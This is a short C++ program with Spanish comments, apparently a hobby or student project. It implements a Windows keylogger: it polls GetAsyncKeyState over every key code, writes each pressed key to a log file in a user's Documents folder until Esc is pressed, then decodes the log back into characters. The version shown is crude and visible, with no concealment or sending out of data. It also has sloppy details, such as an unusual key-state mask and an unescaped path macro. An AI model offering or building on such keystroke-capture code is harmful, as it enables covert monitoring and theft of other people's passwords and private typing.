#include <iostream> //Libreria input output
#include <Windows.h> //Libreria Manejo de SOS windows 
#include <fstream> 
#include <string>
#include "TraductorASCII.h"
using namespace std;
#define LOGFILE "C:\Users\Juan Jose\Documents\Log"

int main(int argc, char** argv)
{
	ofstream archivo("C:\\Users\\Juan Jose\\Documents\\Log\\log.txt");
	BYTE keyState[256];
    bool salir = true;

	while (salir) {
		
        for (int key = 0; key < 256; key++) {
            // Comprueba si la tecla está presionada
            if (GetAsyncKeyState(key) & 0x07) {
                cout << "Tecla presionada: " << key << endl;
                archivo << key << endl;
                // Si es la tecla Esc (código 27), sale del bucle
                if (key == 27) {
                    cout << "Saliendo..." << endl;
                    salir = false;
                    break;
                }
            }
        }

		Sleep(100);

	}
	archivo.close();

    ifstream archivo2("C:\\Users\\Juan Jose\\Documents\\Log\\log.txt");

    if (!archivo2.is_open()) {
        cout << "No se pudo abrir el archivo." << endl;
    }

    string linea;
    int code; 
    char letra;
    // Lee el archivo línea por línea
    while (getline(archivo2, linea)) {
        code = stoi(linea);
        letra = static_cast<char>(code);
        cout << letra << endl;
    }

    archivo2.close();

    
	return 0;

}